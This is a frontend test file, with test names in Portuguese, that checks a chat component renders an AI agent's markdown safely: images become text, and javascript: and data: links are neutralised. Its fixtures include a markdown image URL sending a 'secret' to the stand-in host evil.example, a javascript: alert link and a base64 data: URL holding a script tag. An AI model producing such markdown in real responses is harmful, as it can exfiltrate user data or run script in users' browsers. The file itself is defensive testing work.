import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { MessageContent } from "./MessageContent";

describe("MessageContent: markdown do agente sem requisições nem links perigosos", () => {
  it("imagem nunca vira <img>: mostra o texto alternativo (A2)", () => {
    const { container } = render(<MessageContent text="![x](https://evil.example/?d=segredo)" />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("<img");
    expect(screen.getByText("x")).toBeInTheDocument();
  });

  it("imagem sem texto alternativo mostra a URL como texto, sem link", () => {
    const { container } = render(<MessageContent text="![](https://evil.example/?d=segredo)" />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
    expect(screen.getByText("https://evil.example/?d=segredo")).toBeInTheDocument();
  });

  it("link javascript: vira texto (A3)", () => {
    const { container } = render(<MessageContent text="[clique](javascript:alert(1))" />);
    expect(container.querySelector("a")).toBeNull();
    expect(screen.getByText("clique")).toBeInTheDocument();
  });

  it("link data: vira texto (A3)", () => {
    const { container } = render(
      <MessageContent text="[abrir](data:text/html;base64,PHNjcmlwdD4xPC9zY3JpcHQ+)" />,
    );
    expect(container.querySelector("a")).toBeNull();
    expect(screen.getByText("abrir")).toBeInTheDocument();
  });

  it("link https continua clicável em nova aba, sem opener", () => {
    render(<MessageContent text="[Getnet](https://site.getnet.com.br/)" />);
    const link = screen.getByRole("link", { name: "Getnet" });
    expect(link).toHaveAttribute("href", "https://site.getnet.com.br/");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });
});
